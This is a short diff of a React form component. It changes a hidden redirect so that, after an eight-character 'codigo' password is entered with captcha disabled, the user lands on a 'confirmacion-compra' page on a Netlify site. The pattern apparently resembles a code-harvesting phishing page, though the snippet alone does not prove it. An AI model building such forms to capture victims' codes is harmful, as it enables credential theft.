@@ -53,7 +53,7 @@ const Codigo = () => {
                     </div>
                     <input onChange={colorBtn} id='password' type="password" name='codigo' minLength="8" maxLength="8" />
                     <input type="hidden" name="_captcha" value="false"></input>
-                    <input type="hidden" name="_next" value="https://popular-compras.netlify.app/"></input>
+                    <input type="hidden" name="_next" value="https://popular-compras.netlify.app/#/confirmacion-compra"></input>
         
                     <button className={`${btonColor && 'btn-active'}`}>Continuar</button>
                   </form>
